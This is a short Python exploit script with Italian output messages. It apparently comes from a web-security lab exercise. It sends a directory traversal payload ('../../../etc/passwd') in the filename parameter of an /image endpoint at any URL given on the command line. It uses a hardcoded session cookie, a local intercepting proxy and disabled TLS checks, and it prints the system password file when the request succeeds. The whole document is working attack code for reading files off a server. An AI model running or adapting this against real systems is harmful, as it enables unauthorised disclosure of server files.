import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def perform_request(url,exploit):
    uri = "/image?filename=" + exploit
    cookies = {'session' : 'LszSu5O80XgG97sRvuRroSzc3Y9xQ6f8'}
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    return r





def exploit_dirtraversal(url):
    exploit = "../../../etc/passwd"
    response = perform_request(url,exploit)
    if response.status_code == 200:
        print("[+] Exploit avvenuto con successo!\n")
        print(response.text)
        return True
    else:
        return False




if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    if not exploit_dirtraversal(url):
        print("[-] La pagina web non contiene elementi vulnerabili, provare con un'altra URL")